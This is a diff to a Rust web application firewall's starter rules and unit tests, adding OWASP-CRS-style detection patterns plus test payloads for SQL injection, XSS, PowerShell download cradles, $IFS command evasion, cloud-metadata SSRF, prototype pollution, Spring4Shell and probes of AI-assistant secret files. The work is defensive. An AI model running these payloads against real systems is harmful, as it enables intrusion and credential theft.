@@ -805,6 +805,19 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "sqli_time_based", category: WafCategory::Sqli, pattern: r"(?i)\b(sleep|benchmark|pg_sleep|waitfor\s+delay)\s*\(" },
 		Rule { id: "sqli_information_schema", category: WafCategory::Sqli, pattern: r"(?i)\binformation_schema\b" },
 		Rule { id: "sqli_into_outfile", category: WafCategory::Sqli, pattern: r"(?i)\binto\s+(out|dump)file\b" },
+		// MySQL privilege-escalation / file-read SQL beyond the `INTO OUTFILE` write and the `load_file`
+		// read already covered (OWASP-CRS rules 942151/942320 + 942480): `PROCEDURE ANALYSE` (the
+		// info-leak/version-probe MySQL appends to a query) and `LOAD DATA … INFILE` (the server-side
+		// file read that `sqli_into_outfile` — write-only — and `sqli_oob_exec`'s `load_file` both miss).
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf>
+		Rule { id: "sqli_privilege_functions", category: WafCategory::Sqli, pattern: r"(?i)(\bprocedure\s+analyse\b|\bload\s+data\b[\s\S]{0,40}\binfile\b)" },
+		// Error-based extraction functions (OWASP-CRS rule 942151 function-name set): MySQL's
+		// `EXTRACTVALUE(` / `UPDATEXML(` (force a parse error that leaks query output into the message),
+		// `GTID_SUBSET(`, and the `FLOOR(RAND()` duplicate-entry double-query trick. These extract data
+		// through the DB error channel when UNION/boolean paths are closed — the signal the tautology
+		// and union rules miss. Anchored to the call form (`fn(`) and, for `floor`, to the `rand(`
+		// pairing so an ordinary `floor(x)` math call stays clean. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf>
+		Rule { id: "sqli_error_based", category: WafCategory::Sqli, pattern: r"(?i)(\b(extractvalue|updatexml|gtid_subset)\s*\(|\bfloor\s*\(\s*rand\s*\()" },
 		// Boolean-based blind SQLi beyond `or N=N` (which `sqli_or_tautology` already covers):
 		// `and` with any comparator, or `or` with `<`/`>`. Deliberately excludes `or N=N` so it
 		// does not double-count against `sqli_or_tautology` in anomaly scoring.
@@ -826,6 +839,20 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "xss_data_html_uri", category: WafCategory::Xss, pattern: r"(?i)data:text/html" },
 		Rule { id: "xss_vbscript_uri", category: WafCategory::Xss, pattern: r"(?i)vbscript:" },
 		Rule { id: "xss_svg_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*svg\b" },
+		// Dangerous HTML tags past the script/iframe/svg trio (OWASP-CRS rule 941320 tag-handler port):
+		// plugin/resource loaders and layout-legacy elements that execute script or exfiltrate on their
+		// own — `<object>`/`<embed>`/`<applet>` (plugin content), `<base>` (base-href hijack redirects
+		// every relative URL), `<bgsound>`/`<marquee>`/`<layer>` (legacy auto-fire), `<frame>`/`<frameset>`
+		// (framing injection), `<isindex>`, and `<math>` (MathML XSS). Left `<form>`/`<meta>`/`<link>`/
+		// `<style>` out — they show up in benign rich-text often enough to raise false positives. An
+		// opening `<tag` in a request parameter is near-always an injection attempt. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf>
+		Rule { id: "xss_dangerous_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*(object|embed|applet|marquee|base|bgsound|layer|frame(set)?|isindex|math)\b" },
+		// CSS-context script-binding XSS (OWASP-CRS rule 941170): the two style vectors that execute
+		// script without a `<script>` tag or `on*=` handler — Gecko's deprecated `-moz-binding` (loads
+		// an XBL binding whose constructor runs JS) and IE's `behavior:url(...)` HTC binding. Both are
+		// obsolete legitimately, so their appearance in a reflected `style=`/CSS value is an injection.
+		// <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf>
+		Rule { id: "xss_css_binding", category: WafCategory::Xss, pattern: r"(?i)(-moz-binding|behavior\s*:\s*url\s*\()" },
 		// HTML5 XSS vectors the small handler set above misses (OWASP-CRS 941 port). Newer event
 		// handlers are the go-to bypass when the classic `onerror`/`onload` list is filtered:
 		// animation/transition/pointer events and the popover `onbeforetoggle` all auto-fire.
@@ -855,12 +882,34 @@ pub fn starter_rules() -> Vec<Rule> {
 		// SQL dump, a vim `.swp`. High-signal source/secret disclosure; an operator serving such
 		// files deliberately can `disable_rule("traversal_backup_files")`.
 		Rule { id: "traversal_backup_files", category: WafCategory::PathTraversal, pattern: r"(?i)\.(bak|swp|swo|sql|dump)\b" },
+		// AI coding-assistant artifact directories probed over HTTP (OWASP-CRS rule 930140, added
+		// 4.24.1 via issue #4474 — the `ai-critical-artifacts.data` `@pmFromFile` set). These
+		// per-tool dotdirs hold MCP server definitions, project rules, hooks, and — the real prize
+		// for a scanner — API keys / tokens in env or `settings.local.json` (`.claude/`, `.cursor/`,
+		// Codex `.codex/`, Windsurf `.windsurf/`, Agent Zero `.a0proj/secrets.env`, …). Enclosing-slash
+		// / dot-segment anchored like the VCS-config rule so `/declared/` and `x.cursor` stay clean;
+		// `.qwen_code` and `.crush` ship without a trailing slash in the CRS data file, so they take a
+		// word-boundary tail instead. <https://github.com/coreruleset/coreruleset/blob/main/rules/ai-critical-artifacts.data>
+		Rule { id: "traversal_ai_assistant_artifacts", category: WafCategory::PathTraversal, pattern: r"(?i)(/\.(claude|cursor|continue|aider|roo|zed|cline|kiro|windsurf|rovodev|codex|opencode|a0proj|plandex|fabric|n8n|junie|gemini|openclaw|clawdbot|trustclaw|zeroclaw|warp)/|/\.(qwen_code|crush)\b)" },
 		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob)://" },
 		// --- OS command injection ---
 		Rule { id: "cmdi_shell_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(cat|ls|id|whoami|uname|wget|curl|ncat|nc|bash|sh|python|perl|powershell|cmd)\b" },
 		Rule { id: "cmdi_path_bin", category: WafCategory::CommandInjection, pattern: r"(?i)/bin/(sh|bash|dash|zsh|busybox|nc)\b" },
 		Rule { id: "cmdi_command_substitution", category: WafCategory::CommandInjection, pattern: r"(?i)\$\(\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|env|echo|printf)\b" },
 		Rule { id: "cmdi_windows_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|]\s*(dir|type|net\s+user|ping\s+-n|certutil|bitsadmin|tasklist|systeminfo)\b" },
+		// PowerShell download-cradle / encoded-command RCE (OWASP-CRS rules 932120/932125): the vectors
+		// the `cmd.exe`-flavored `cmdi_windows_command` misses — the `Invoke-*` cmdlets and their
+		// aliased call form (`iex(`), the `Net.WebClient().DownloadString` / `Invoke-WebRequest`
+		// fileless download cradle, `[Convert]::FromBase64String`, and the `-EncodedCommand`/`-nop`/
+		// `-w hidden` launcher flags that ride a base64 blob. Anchored on PowerShell-specific idioms so
+		// prose that merely says "invoke" or "hidden" stays clean. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_powershell", category: WafCategory::CommandInjection, pattern: r"(?i)(invoke-expression|invoke-webrequest|invoke-restmethod|downloadstring|downloadfile|net\.webclient|frombase64string|\biex\s*\(|-encodedcommand\b|-enc\b|-nop\b|-noprofile\b|-w\s+hidden|-windowstyle\s+hidden)" },
+		// Unix `$IFS` whitespace-evasion (OWASP-CRS rules 932130/932200): the internal-field-separator
+		// substitution attackers use to smuggle a space-free command past filters that key on literal
+		// whitespace — `cat${IFS}/etc/passwd`, `wget$IFS$9http://…`. Matches the `$IFS` / `${IFS}`
+		// token itself; the `\b` tail keeps `$IFSomething` and a benign `${IF}` conditional clean.
+		// The `${IFS}` sequence does not occur in ordinary HTTP. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf>
+		Rule { id: "cmdi_ifs_evasion", category: WafCategory::CommandInjection, pattern: r"\$\{?IFS\b" },
 		// Shell fork-bomb resource-exhaustion payload (OWASP-CRS 4.25.0 LTS, PL2) — the classic
 		// `:(){ :|:& };:`. Keyed on the recursive self-pipe-into-background `:|:&` rather than the
 		// `(){` function-definition head, so it is a distinct signal from `anomaly_shellshock`'s
@@ -882,6 +931,12 @@ pub fn starter_rules() -> Vec<Rule> {
 		// Cloud metadata reachable by DNS name rather than the 169.254.169.254 link-local IP —
 		// GCP's `metadata.google.internal`. A value-inspection SSRF target the IP/path rules miss.
 		Rule { id: "ssrf_metadata_hostname", category: WafCategory::Ssrf, pattern: r"(?i)\bmetadata\.google\.internal\b" },
+		// Non-AWS cloud metadata endpoints the 169.254.169.254 IP + AWS/GCP/Azure path rules miss:
+		// Alibaba Cloud's distinct link-local metadata IP `100.100.100.200` (cloud-agnostic SSRF
+		// tooling routinely forgets it), and Oracle OCI's `/opc/v{1,2}/` metadata path (OCI keeps the
+		// 169.254 IP but exposes metadata under `/opc/`, so the AWS `/latest/meta-data` path rule does
+		// not fire). Value-inspection, no client IP needed. <https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf>
+		Rule { id: "ssrf_vendor_metadata", category: WafCategory::Ssrf, pattern: r"(?i)(100\.100\.100\.200|/opc/v[12]/)" },
 		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
 		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
 		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
@@ -897,7 +952,13 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "code_ssti_hash_delim", category: WafCategory::CodeInjection, pattern: r"#\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		Rule { id: "code_ssti_razor", category: WafCategory::CodeInjection, pattern: r"@\(\s*\d+\s*[*]\s*\d+\s*\)" },
 		Rule { id: "code_ssti_thymeleaf", category: WafCategory::CodeInjection, pattern: r"\*\{\s*\d+\s*[*]\s*\d+\s*\}" },
-		Rule { id: "code_java_serialized", category: WafCategory::CodeInjection, pattern: r"rO0AB[A-Za-z0-9+/=]{2,}" },
+		// Java serialized-object stream smuggled base64 through a text field (cookie/header/body) — the
+		// delivery vehicle for a Commons-Collections-style gadget chain. `rO0AB…` is the base64 opener
+		// of the raw `\xac\xed\x00\x05` STREAM_MAGIC header (the raw bytes rarely survive as valid UTF-8
+		// in a string field, so the base64 form is the one that appears). Broadened to the `KztAAU` /
+		// `Cs7QAF` gzip/variant openers OWASP-CRS rule 944210 lists alongside the raw one. Case-SENSITIVE
+		// (base64 is) — the exact openers do not occur in benign text. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf>
+		Rule { id: "code_java_serialized", category: WafCategory::CodeInjection, pattern: r"(?:rO0AB[A-Za-z0-9+/=]{2,}|KztAAU|Cs7QAF)" },
 		// Double-extension upload filename (the file-upload RCE vector behind CVE-2026-33691): a
 		// benign-looking media/document/archive extension immediately followed by a *trailing*
 		// server-script extension — `avatar.jpg.php`, `report.pdf.jsp`, `notes.txt.phtml`. The
@@ -925,6 +986,21 @@ pub fn starter_rules() -> Vec<Rule> {
 		// and template-injection chains. Keyed on the module require plus the `child_process.<fn>`
 		// call form, both Node-specific, so ordinary prose stays clean.
 		Rule { id: "code_node_child_process", category: WafCategory::CodeInjection, pattern: r#"(?i)(require\s*\(\s*['"]child_process['"]|child_process\s*\.\s*(exec|execsync|spawn|spawnsync|fork))"# },
+		// JavaScript prototype pollution (OWASP-CRS rule 934130, CRITICAL/PL1): the `__proto__`
+		// sentinel key and the `constructor.prototype` / `constructor[prototype]` chained-access
+		// forms an attacker smuggles through a query/body parameter to poison `Object.prototype` —
+		// the entry gadget for many Node RCE chains that then reach `code_node_child_process`.
+		// Faithful port of CRS's `__proto__|constructor[\s\x0b]*(?:\.|\]?\[)[\s\x0b]*prototype`
+		// (Rust `\s` already covers the vertical-tab CRS spells out); the `\]?\[` limb catches the
+		// `obj[constructor][prototype]` bracket-chain the dotted form misses. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf>
+		Rule { id: "code_prototype_pollution", category: WafCategory::CodeInjection, pattern: r"(?i)(__proto__|constructor\s*(?:\.|\]?\[)\s*prototype)" },
+		// Spring4Shell class-loader manipulation (OWASP-CRS rule 944260, CVE-2022-22965): a data-binding
+		// payload walking `class.module.classLoader...` to rewrite the Tomcat access-log pattern into a
+		// webshell, plus the `springframework.context.support.FileSystemXmlApplicationContext` SpEL
+		// gadget. Keyed on the invariant `class.module.classloader` head rather than CRS's exact
+		// `.resources.context.parent.pipeline` tail (attackers vary the tail) — the head never occurs in
+		// benign HTTP. <https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf>
+		Rule { id: "code_spring4shell", category: WafCategory::CodeInjection, pattern: r"(?i)(class\.module\.classloader|springframework\.context\.support\.filesystemxmlapplicationcontext)" },
 		// --- NoSQL injection (MongoDB query-operator smuggling; value inspection, no client IP) ---
 		Rule { id: "nosqli_mongo_where", category: WafCategory::NoSqlInjection, pattern: r"(?i)\$where\b" },
 		Rule { id: "nosqli_param_operator", category: WafCategory::NoSqlInjection, pattern: r"(?i)\[\$(ne|eq|gt|gte|lt|lte|in|nin|regex|exists|not|or|nor|and|where)\]" },
@@ -1103,6 +1179,50 @@ mod tests {
 	}
 
 	#[test]
+	fn sqli_privilege_functions_match() {
+		// OWASP-CRS 942151/942320 + 942480: PROCEDURE ANALYSE and LOAD DATA INFILE, the file-read /
+		// info-leak SQL the write-only `sqli_into_outfile` and `load_file` rules miss.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("id=1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)", "query").unwrap().rule_id, "sqli_privilege_functions");
+		assert_eq!(waf.inspect_str("q=1;LOAD DATA INFILE '/etc/hostname' INTO TABLE t", "query").unwrap().category, WafCategory::Sqli);
+		assert_eq!(waf.inspect_str("x=load data local infile 'f'", "query").unwrap().rule_id, "sqli_privilege_functions");
+	}
+
+	#[test]
+	fn sqli_privilege_functions_keep_false_positives_low() {
+		// Prose and reordered tokens that brush near the keywords without the attack syntax stay clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/stored-procedure-guide",  // "procedure" word, no "procedure analyse"
+			"/api/load-more-data",           // "load" + "data" as words, no INFILE
+			"/blog/analyse-your-traffic",    // "analyse" alone
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn sqli_error_based_functions_match() {
+		// OWASP-CRS 942151: the MySQL error-channel extraction primitives.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("id=1 AND extractvalue(1,concat(0x7e,version()))", "query").unwrap().rule_id, "sqli_error_based");
+		assert_eq!(waf.inspect_str("id=1 AND updatexml(1,concat(0x7e,user()),1)", "query").unwrap().rule_id, "sqli_error_based");
+		assert_eq!(waf.inspect_str("id=1 OR gtid_subset(user(),1)", "query").unwrap().category, WafCategory::Sqli);
+		assert_eq!(waf.inspect_str("id=1 AND (SELECT 1 FROM(SELECT COUNT(*),floor(rand(0)*2)x FROM t GROUP BY x)y)", "query").unwrap().rule_id, "sqli_error_based");
+	}
+
+	#[test]
+	fn sqli_error_based_keeps_false_positives_low() {
+		// An ordinary `floor(` math call and prose stay clean — the rule needs `floor(rand(` or the
+		// unambiguous extraction-function call forms.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("price=floor(total/count)", "query").is_none(), "floor() math should not false-positive");
+		for uri in ["/docs/xml-extract-tutorial", "/api/floor-plans", "/blog/random-numbers"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
 	fn extended_xss_rules_match() {
 		let waf = Waf::starter();
 		assert_eq!(waf.inspect_str("<iframe src=//evil", "target").unwrap().rule_id, "xss_iframe_tag");
@@ -1127,6 +1247,65 @@ mod tests {
 		// dangerous attributes stay clean.
 		let waf = Waf::starter();
 		for uri in ["/settings?onboarding=done", "/form?action=save", "/docs/pointer-events-css", "/page?transition=fade"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn dangerous_html_tags_match() {
+		// OWASP-CRS 941320 tag-handler port: plugin/resource loaders and legacy auto-fire tags beyond
+		// the existing script/iframe/svg rules all attribute to the Xss class.
+		let waf = Waf::starter();
+		// Payloads kept free of `javascript:`/`on*=` handlers so first-match attributes them to the
+		// tag rule rather than the (earlier) URI / event-handler rules — the tag itself is the signal.
+		for (payload, why) in [
+			("x=<object data=//evil/x.swf>", "object"),
+			("x=<embed src=//evil/x.swf>", "embed"),
+			("x=<applet code=Evil>", "applet"),
+			("x=<base href=//evil/>", "base-href hijack"),
+			("x=<bgsound src=//evil/x.wav>", "bgsound"),
+			("x=<marquee behavior=scroll>", "marquee"),
+			("x=<frameset cols=50%>", "frameset"),
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip a dangerous-tag rule"));
+			assert_eq!(m.rule_id, "xss_dangerous_tag", "{payload} ({why})");
+			assert_eq!(m.category, WafCategory::Xss);
+		}
+	}
+
+	#[test]
+	fn dangerous_html_tags_keep_false_positives_low() {
+		// Prose naming the tags as words, and the deliberately-excluded `<form>`/`<meta>` (left out to
+		// avoid rich-text false positives), stay clean at this rule.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/embed-a-video",       // "embed" as a word, no `<embed`
+			"/blog/object-oriented",     // "object" prose
+			"/shop/database-marquee",    // "marquee" as a word
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn css_binding_xss_matches() {
+		// OWASP-CRS 941170: the CSS-context script-binding vectors that carry no `<script>`/`on*=`.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("style=x:expr;-moz-binding:url(//evil/x.xml#e)", "query").unwrap().rule_id, "xss_css_binding");
+		assert_eq!(waf.inspect_str("style=behavior:url(evil.htc)", "query").unwrap().category, WafCategory::Xss);
+		assert_eq!(waf.inspect_str("s=behavior : url ( x )", "query").unwrap().rule_id, "xss_css_binding");
+	}
+
+	#[test]
+	fn css_binding_xss_keeps_false_positives_low() {
+		// Prose that names "behavior" or "binding" as words, without the CSS `:url(` / `-moz-binding`
+		// syntax, stays clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/user-behavior-analytics",  // "behavior" word, no `behavior:url(`
+			"/blog/data-binding-in-vue",      // "binding" word, no `-moz-binding`
+			"/api/behavior?mode=url",         // "behavior" + "url" split, no `behavior:url(`
+		] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
@@ -1183,6 +1362,64 @@ mod tests {
 		// stay clean: a time range, an alternation filter, a piped shell-doc URL.
 		let waf = Waf::starter();
 		for uri in ["/calendar?slot=09:00|10:00", "/logs?level=info|warn|error", "/docs/using-the-pipe-operator"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn powershell_rce_rule_matches() {
+		// OWASP-CRS 932120/932125: the download cradle, the encoded-command launcher, and the aliased
+		// `iex(` call form — the PowerShell RCE vectors the cmd.exe rule misses.
+		let waf = Waf::starter();
+		for (payload, why) in [
+			("(New-Object Net.WebClient).DownloadString('http://x/a.ps1')", "download cradle"),
+			("powershell -nop -w hidden -enc SQBFAFgA", "encoded launcher"),
+			("cmd=Invoke-Expression($env:x)", "invoke-expression"),
+			("q=iex (iwr http://x/p)", "aliased iex call"),
+			("d=[Convert]::FromBase64String('...')", "base64 decode"),
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} ({why}) should trip the powershell rule"));
+			assert_eq!(m.rule_id, "cmdi_powershell", "{payload} ({why})");
+			assert_eq!(m.category, WafCategory::CommandInjection);
+		}
+	}
+
+	#[test]
+	fn powershell_rce_keeps_false_positives_low() {
+		// Prose that merely names "invoke", "hidden", or "webclient" as words — without the PowerShell
+		// cmdlet/flag idioms — stays clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/how-to-invoke-a-callback",  // "invoke" prose, no `Invoke-<cmdlet>`
+			"/blog/hidden-features",           // "hidden" word, no `-w hidden` flag
+			"/api/webclient-usage",            // "webclient" word, no `Net.WebClient`
+			"/search?q=encoded+video",         // "encoded" word, no `-EncodedCommand`
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn ifs_evasion_rule_matches() {
+		// OWASP-CRS 932130/932200: the `$IFS` / `${IFS}` internal-field-separator substitution used to
+		// build a space-free command line.
+		let waf = Waf::starter();
+		// Payloads kept free of other triggers (no `/etc/passwd`, no leading separator) so first-match
+		// attributes them to the IFS rule specifically.
+		for payload in ["cat${IFS}secret.txt", "ls${IFS}-la${IFS}/tmp", "echo$IFS$9done"] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should trip the IFS rule"));
+			assert_eq!(m.rule_id, "cmdi_ifs_evasion", "{payload}");
+			assert_eq!(m.category, WafCategory::CommandInjection);
+		}
+	}
+
+	#[test]
+	fn ifs_evasion_keeps_false_positives_low() {
+		// A `$IFS`-adjacent identifier and a benign `${IF}`-style token stay clean — the rule needs the
+		// exact `IFS` word.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("total=$IFSprofit", "query").is_none(), "$IFSprofit should not false-positive");
+		for uri in ["/docs/if-statements", "/api/config?tpl=${IF}-then"] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
@@ -1750,6 +1987,31 @@ mod tests {
 	}
 
 	#[test]
+	fn ssrf_vendor_metadata_match() {
+		// Alibaba's distinct metadata IP and Oracle OCI's `/opc/v{1,2}/` path — the non-AWS endpoints
+		// the 169.254 IP and AWS/GCP/Azure path rules miss.
+		let waf = Waf::starter();
+		// Bare Alibaba IP (a `/latest/meta-data` path would trip the earlier generic path rule first).
+		assert_eq!(waf.inspect_str("url=http://100.100.100.200/instance-id", "query").unwrap().rule_id, "ssrf_vendor_metadata");
+		// The OCI form keeps the 169.254 IP, so first-match attributes it to the IP rule — still SSRF.
+		assert_eq!(waf.inspect_str("url=http://169.254.169.254/opc/v2/instance/", "query").unwrap().category, WafCategory::Ssrf);
+		assert_eq!(waf.inspect_str("target=/opc/v1/instance/id", "query").unwrap().rule_id, "ssrf_vendor_metadata");
+	}
+
+	#[test]
+	fn ssrf_vendor_metadata_keeps_false_positives_low() {
+		// A look-alike IP and an `/opc/` path without the version segment stay clean.
+		let waf = Waf::starter();
+		for uri in [
+			"/status?ip=100.100.100.20",   // one octet short of the metadata IP
+			"/docs/opc-ua-protocol",       // "opc" as a word, not the `/opc/v1/` path
+			"/api/opc/status",             // `/opc/` without the `v{1,2}/` metadata segment
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
 	fn ssrf_obfuscated_loopback_keeps_false_positives_low() {
 		// Benign URLs and hex/number-bearing paths that are not obfuscated loopbacks must pass.
 		let waf = Waf::starter();
@@ -1833,6 +2095,82 @@ mod tests {
 		assert_eq!(waf.inspect_str("p=new ProcessBuilder('sh','-c','id')", "query").unwrap().rule_id, "code_java_runtime_exec");
 		assert_eq!(waf.inspect_str("m=require('child_process').exec('id')", "query").unwrap().rule_id, "code_node_child_process");
 		assert_eq!(waf.inspect_str("m=child_process.spawnSync('id')", "query").unwrap().rule_id, "code_node_child_process");
+	}
+
+	#[test]
+	fn prototype_pollution_rule_matches() {
+		// OWASP-CRS 934130: the `__proto__` sentinel plus the dotted and bracket-chain
+		// `constructor.prototype` access forms, however whitespace-padded.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("__proto__[polluted]=1", "query").unwrap().rule_id, "code_prototype_pollution");
+		// The JSON pollution vector rides the `__proto__` limb (CRS keys the nested-key form off it).
+		assert_eq!(waf.inspect_str(r#"{"__proto__": {"polluted": true}}"#, "body").unwrap().rule_id, "code_prototype_pollution");
+		assert_eq!(waf.inspect_str("a=constructor.prototype.toString", "query").unwrap().rule_id, "code_prototype_pollution");
+		assert_eq!(waf.inspect_str("a=constructor[prototype]", "query").unwrap().rule_id, "code_prototype_pollution");
+		assert_eq!(waf.inspect_str("a=obj[constructor][prototype]", "query").unwrap().rule_id, "code_prototype_pollution");
+		assert_eq!(waf.inspect_str("a=constructor . prototype", "query").unwrap().category, WafCategory::CodeInjection);
+	}
+
+	#[test]
+	fn prototype_pollution_keeps_false_positives_low() {
+		// A class named "constructor", a docs mention of prototypes, and a "prototype" query value
+		// with no `constructor`/`__proto__` chain all stay clean — the rule needs the pairing.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/constructor-functions",  // "constructor" as a word, no `.prototype` chain
+			"/blog/prototype-design",       // "prototype" alone, no `constructor` head
+			"/api/build-a-prototype",       // ditto
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn spring4shell_rule_matches() {
+		// OWASP-CRS 944260 (CVE-2022-22965): the class-loader walk and the SpEL context gadget.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", "body").unwrap().rule_id, "code_spring4shell");
+		assert_eq!(waf.inspect_str("x=org.springframework.context.support.FileSystemXmlApplicationContext", "query").unwrap().rule_id, "code_spring4shell");
+		assert_eq!(waf.inspect_str("class.module.classLoader.DefaultAssertionStatus=1", "body").unwrap().category, WafCategory::CodeInjection);
+	}
+
+	#[test]
+	fn spring4shell_keeps_false_positives_low() {
+		// A Java-flavored path that names a class loader as prose, and a Spring docs page, both stay
+		// clean — the rule needs the exact `class.module.classloader` chain or the SpEL gadget FQN.
+		let waf = Waf::starter();
+		for uri in [
+			"/docs/java-classloader-guide",   // "classloader" word, no `class.module.` chain
+			"/blog/spring-framework-context",  // "spring" + "context" prose, no gadget FQN
+			"/api/module-class-registry",      // reordered tokens, not the attack chain
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn java_serialized_variant_markers_match() {
+		// The `rO0AB…` raw base64 opener was already covered; this asserts the CRS 944210 gzip/variant
+		// openers (`KztAAU` / `Cs7QAF`) added to the same `code_java_serialized` rule also trip.
+		let waf = Waf::starter();
+		assert_eq!(waf.inspect_str("state=rO0ABXNyABBqYXZh", "body").unwrap().rule_id, "code_java_serialized");
+		assert_eq!(waf.inspect_str("d=KztAAU9uZQ", "query").unwrap().rule_id, "code_java_serialized");
+		assert_eq!(waf.inspect_str("blob=Cs7QAFsomegzippeddata", "body").unwrap().category, WafCategory::CodeInjection);
+	}
+
+	#[test]
+	fn java_serialized_markers_keep_false_positives_low() {
+		// Ordinary base64 that does not open with a serialization magic stays clean, and the markers
+		// are case-sensitive so a lowercased look-alike in a path does not trip them.
+		let waf = Waf::starter();
+		assert!(waf.inspect_str("aGVsbG8gd29ybGQ=", "body").is_none(), "benign base64 should not false-positive");
+		for uri in [
+			"/files/ro0abstract-notes.txt",  // lowercase "ro0ab", not the case-sensitive marker
+			"/img/logo-rO0.png",             // partial, no full `rO0AB` opener
+			"/data/kztaau-lowercase.bin",    // lowercased variant opener stays clean
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
 	}
 
 	#[test]
@@ -1999,6 +2337,18 @@ mod tests {
 			("/backups/db.sql", "traversal_backup_files"),
 			("/wp-config.php.bak", "traversal_backup_files"),
 			("/index.php.swp", "traversal_backup_files"),
+			// AI coding-assistant artifact dotdirs (CRS rule 930140 / ai-critical-artifacts.data).
+			("/.claude/settings.local.json", "traversal_ai_assistant_artifacts"),
+			("/.cursor/mcp.json", "traversal_ai_assistant_artifacts"),
+			("/.codex/config.toml", "traversal_ai_assistant_artifacts"),
+			("/.windsurf/rules", "traversal_ai_assistant_artifacts"),
+			("/.a0proj/secrets.env", "traversal_ai_assistant_artifacts"),
+			("/.n8n/config", "traversal_ai_assistant_artifacts"),
+			// Nested under a project subdir — the substring is still anchored by its enclosing slash.
+			("/repo/.aider/aider.conf.yml", "traversal_ai_assistant_artifacts"),
+			// The two CRS entries that ship without a trailing slash take a word-boundary tail.
+			("/.qwen_code", "traversal_ai_assistant_artifacts"),
+			("/.crush", "traversal_ai_assistant_artifacts"),
 		] {
 			let v = waf.inspect(&parts("GET", uri));
 			let m = blocked(&v);
@@ -2019,6 +2369,13 @@ mod tests {
 			"/products/webcconfig-tool", // "webconfig" != "/web.config"
 			"/docs/backup-strategies",   // "backup" as a word, no `.bak` extension
 			"/blog/nosql-basics",        // "sql" inside "nosql", no `.sql` extension
+			// AI-artifact look-alikes: the tool names as path words, without the leading `/.` dot
+			// segment (CRS 930140 matches the dotdir, not the bare word).
+			"/blog/claude-code-tips",    // "claude" as a word, no `/.claude/`
+			"/products/cursor-ide",      // "cursor" as a word, no `/.cursor/`
+			"/docs/continue-reading",    // "continue" prose, no `/.continue/`
+			"/.crushed-ice",             // `.crush` guarded by \b: "crushed" != ".crush\b"
